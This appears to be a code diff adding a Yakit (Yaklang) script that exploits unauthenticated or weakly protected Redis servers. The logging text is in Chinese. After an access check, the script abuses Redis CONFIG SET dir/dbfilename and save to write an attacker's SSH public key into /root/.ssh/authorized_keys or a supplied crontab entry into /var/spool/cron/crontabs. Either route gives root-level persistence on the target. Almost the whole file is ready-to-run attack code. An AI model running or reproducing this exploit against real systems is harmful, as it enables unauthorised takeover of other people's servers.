@@ -1,0 +1,196 @@
+log.setLevel("info")  // 设置日志级别
+yakit.AutoInitYakit()
+
+target = cli.String("target")
+if target == "" {
+    yakit.Error("Empty Target")
+    return
+}
+
+port = cli.Int("port", cli.setDefault(6379))
+if port <= 0 {
+    yakit.Error("Port is invalid")
+    return
+}
+
+// writePublicKey = cli.Bool("writePublicKey"
+PublicKey = cli.String("PublicKey")
+// writeCrontab = cli.Bool("writeCrontab")
+Crontab = cli.String("Crontab")
+passwd = cli.String("passwd")
+
+redispoc = func(target,port)  {
+    conn.Send("info\r\n")
+    result, err := conn.RecvStringTimeout(1)
+    if str.MatchAllOfSubString(result, "redis_version:") {
+        log.info("存在redis未授权访问")
+        yakit.Info("存在redis未授权访问")
+        conn.Send("CONFIG SET dir /root/.ssh/\r\n")
+        result, err := conn.RecvStringTimeout(1)
+        if str.MatchAllOfSubString(result, "OK") {
+            log.info("%v可以写入PublicKey",target)
+            yakit.Info("%v可以写入PublicKey",target)
+        }else{
+            log.error("/root/.ssh/无权限")
+            yakit.Error("/root/.ssh/无权限")
+        }
+        conn.Send("CONFIG SET dir /var/spool/cron/crontabs\r\n")
+        result, err := conn.RecvStringTimeout(1)
+        if str.MatchAllOfSubString(result, "OK") {
+            log.info("%v可以写入Crontab", target)
+            yakit.Info("%v可以写入Crontab", target)
+        }else{
+            log.error("写入Crontab无权限")
+            yakit.Error("写入Crontab无权限")
+        }
+    }else {
+        log.error("不存在redis未授权访问,或者有密码")
+        yakit.Error("不存在redis未授权访问,或者有密码")
+    }
+
+}
+
+ 
+redisWriteCrontab = func(target,port,Crontab) {
+    conn.Send("CONFIG SET dir /var/spool/cron/crontabs\r\n")
+    result, err := conn.RecvStringTimeout(1)
+    if str.MatchAllOfSubString(result, "OK") {
+        log.info("设置目录成功")
+        yakit.Info("设置目录成功")
+        conn.Send("CONFIG SET dbfilename root\r\n")
+        result, err := conn.RecvStringTimeout(1)
+        if str.MatchAllOfSubString(result, "OK") {
+            log.info("设置dbfilename成功")
+            yakit.Info("设置dbfilename成功")
+            conn.Send(sprintf("set xx \"\\n%v\\n\"\r\n",Crontab))
+            result, err := conn.RecvStringTimeout(1)
+            if str.MatchAllOfSubString(result, "OK") {
+                log.info("写入Crontab key成功")
+                yakit.Info("写入Crontab key成功")
+                conn.Send("save\r\n")
+                result, err := conn.RecvStringTimeout(1)
+                if str.MatchAllOfSubString(result, "OK") {
+                    log.info("保存成功")
+                    yakit.Info("保存成功")
+                }
+            }
+        }
+    }else {
+        log.error("不存在redis未授权访问,或者有密码")
+        yakit.Error("不存在redis未授权访问,或者有密码")
+    }
+
+}
+
+redisWritePublicKey = func(target,port,PublicKey) {
+    conn.Send("CONFIG SET dir /root/.ssh\r\n")
+    result, err := conn.RecvStringTimeout(1)
+    if str.MatchAllOfSubString(result, "OK") {
+        log.info("设置目录成功")
+        yakit.Info("设置目录成功")
+        conn.Send("CONFIG SET dbfilename authorized_keys\r\n")
+        result, err := conn.RecvStringTimeout(1)
+        if str.MatchAllOfSubString(result, "OK") {
+            log.info("设置dbfilename成功")
+            yakit.Info("设置dbfilename成功")
+            conn.Send(sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n",PublicKey))
+            result, err := conn.RecvStringTimeout(1)
+            if str.MatchAllOfSubString(result, "OK") {
+                log.info("写入Public key成功")
+                yakit.Info("写入Public key成功")
+                conn.Send("save\r\n")
+                result, err := conn.RecvStringTimeout(1)
+                if str.MatchAllOfSubString(result, "OK") {
+                    log.info("保存成功")
+                    yakit.Info("保存成功")
+                }
+            }
+        }
+    }else {
+        log.error("不存在redis未授权访问,或者有密码")
+        yakit.Error("不存在redis未授权访问,或者有密码")
+    }
+}
+switch {
+    case PublicKey !="":
+        println("写入公钥到/root/.ssh目录")
+        if passwd  != "" {
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            conn.Send(sprintf("auth %v\r\n", passwd))
+            result, err := conn.RecvStringTimeout(1)
+            if str.MatchAllOfSubString(result, "OK") {
+                log.info("认证成功")
+                yakit.Info("认证成功")
+                redisWritePublicKey(target,port,PublicKey)
+            }else{
+                log.error("认证失败,密码有误")
+                yakit.Error("认证失败,密码有误")
+            }
+        }else {
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            redisWritePublicKey(target,port,PublicKey)
+        }
+    case Crontab != "":
+        println("写入crontab任务至/var/spool/cron/crontabs")
+        if passwd  != "" {
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            conn.Send(sprintf("auth %v\r\n", passwd))
+            result, err := conn.RecvStringTimeout(1)
+            if str.MatchAllOfSubString(result, "OK") {
+                log.info("认证成功")
+                yakit.Info("认证成功")
+                redisWriteCrontab(target,port,Crontab)
+            }else{
+                log.error("认证失败,密码有误")
+                yakit.Error("认证失败,密码有误")
+            }
+        }else {
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            redisWriteCrontab(target,port,Crontab)
+        }
+        
+    default:
+        println("poc")
+        if passwd  != "" {
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            conn.Send(sprintf("auth %v\r\n", passwd))
+            result, err := conn.RecvStringTimeout(1)
+            if str.MatchAllOfSubString(result, "OK") {
+                log.info("认证成功")
+                yakit.Info("认证成功")
+                redispoc(target,port)
+            }else{
+                log.error("认证失败,密码有误")
+                yakit.Error("认证失败,密码有误")
+            }
+        }else {
+            // println("1")
+            conn,err = tcp.Connect(target, port)
+            if err != nil {
+                yakit.Error("Connect to %v failed: %v", target, err)
+            }
+            die(err)
+            redispoc(target,port)
+        }
+
+}
